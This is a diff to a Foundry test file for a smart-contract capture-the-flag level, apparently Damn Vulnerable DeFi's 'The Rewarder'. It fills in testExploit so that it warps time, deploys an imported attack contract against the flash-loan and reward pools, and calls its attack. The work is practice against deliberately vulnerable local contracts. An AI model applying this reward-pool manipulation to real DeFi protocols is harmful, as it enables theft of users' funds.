@@ -9,6 +9,7 @@ import {TheRewarderPool} from "../../../src/Contracts/the-rewarder/TheRewarderPo
 import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
+import {Rewardead} from "./Rewardead.sol";
 
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
@@ -84,18 +85,30 @@ contract TheRewarder is Test {
         console.log(unicode"🧨 Let's see if you can break it... 🧨");
     }
 
-    function testExploit() public {
-        /**
-         * EXPLOIT START *
-         */
+    //****************************************** */
+    //****************************************** */
 
-        /**
-         * EXPLOIT END *
-         */
+    function testExploit() public {
+        vm.warp(block.timestamp + 5 days); // 5 days
+        Rewardead rewardead = new Rewardead(
+            attacker,
+            address(dvt),
+            address(theRewarderPool.rewardToken()),
+            address(theRewarderPool),
+            address(flashLoanerPool)
+        );
+        rewardead.getFunds();
+        // vm.warp(block.timestamp + 10 days); // 5 days
+        rewardead.attack();
+
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
     }
 
+
+    //****************************************** */
+    //****************************************** */
+    
     function validation() internal {
         assertEq(theRewarderPool.roundNumber(), 3); // Only one round should have taken place
         for (uint8 i; i < 4; i++) {
